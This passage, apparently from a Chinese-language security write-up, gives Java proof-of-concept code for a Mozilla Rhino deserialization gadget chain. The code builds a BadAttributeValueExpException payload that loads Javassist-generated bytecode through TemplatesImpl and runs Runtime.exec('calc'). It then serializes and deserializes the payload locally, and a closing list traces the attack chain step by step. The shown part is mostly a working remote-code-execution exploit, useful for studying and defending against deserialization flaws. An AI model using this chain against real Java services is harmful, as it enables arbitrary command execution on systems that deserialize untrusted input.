        Class memberboxClass = Class.forName("org.mozilla.javascript.MemberBox");
        Constructor memberboxClassConstructor = memberboxClass.getDeclaredConstructor(Method.class);
        memberboxClassConstructor.setAccessible(true);
        Object memberboxes = memberboxClassConstructor.newInstance(enterMethod);
        getter.set(slot, memberboxes);

        NativeJavaObject nativeObject = new NativeJavaObject(scriptableObject, genTemplates(), TemplatesImpl.class);
        idScriptableObject.setPrototype(nativeObject);

        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);
        Field valField = badAttributeValueExpException.getClass().getDeclaredField("val");
        valField.setAccessible(true);
        valField.set(badAttributeValueExpException, idScriptableObject);

        serialize(badAttributeValueExpException);
        unSerialize();
    }

    public static void serialize(Object obj)throws Exception {
        FileOutputStream fos = new FileOutputStream(serialFileName);
        ObjectOutputStream oos = new ObjectOutputStream(fos);
        oos.writeObject(obj);
        oos.flush();
        oos.close();
        fos.close();
    }
    public static void unSerialize() throws Exception {
        // 本地模拟反序列化
        FileInputStream fis = new FileInputStream(serialFileName);
        ObjectInputStream ois = new ObjectInputStream(fis);
        Object ignore = (Object) ois.readObject();
    }

    public static TemplatesImpl genTemplates() throws Exception{
        String shellcode = "calc";
        String executeCode = "Runtime.getRuntime().exec(\"" + shellcode + "\");";
        ClassPool pool = ClassPool.getDefault();
        CtClass evil = pool.makeClass("ysoserial.Evil");
        evil.makeClassInitializer().insertAfter(executeCode);
        evil.setName("ysoserial.Pwner" + System.nanoTime());
        CtClass superC = pool.get(AbstractTranslet.class.getName());
        evil.setSuperclass(superC);

        final byte[] classBytes = evil.toBytecode();
        byte[][] trueclassbyte = new byte[][]{classBytes};

        Class<TemplatesImpl> templatesClass = TemplatesImpl.class;
        TemplatesImpl templates = TemplatesImpl.class.newInstance();
        Field bytecodes = templatesClass.getDeclaredField("_bytecodes");
        bytecodes.setAccessible(true);
        bytecodes.set(templates, trueclassbyte);

        Field name = templatesClass.getDeclaredField("_name");
        name.setAccessible(true);
        name.set(templates, "Pwnr");

        Field tfactory = templatesClass.getDeclaredField("_tfactory");
        tfactory.setAccessible(true);
        tfactory.set(templates, new TransformerFactoryImpl());

        return templates;
    }
}
```

## 攻击链

* BadAttributeValueExpException.readObject()

  * BadAttributeValueExpException.toString()

    * NativeError.toString()
    * NativeError.js_toString()
    * NativeError.getString()
      * ScriptableObject.getProperty()
        * IdScriptableObject.get()
        * ScriptableObject.get
        * ScriptableObject.getImpl
        * NativeJavaMethod.call()
        * MemberBox.invoke()
          * TemplatesImpl.getOutputProperties()
          * TemplatesImpl.newTransformer()
            *  TemplatesImpl.getTransletInstance()
              * TemplatesImpl.defineTransletClasses()
                * TemplatesImpl.TransletClassLoader.defineClass()
                  * Pwner*(Javassist-generated).<static init>
                    * Runtime.exec()

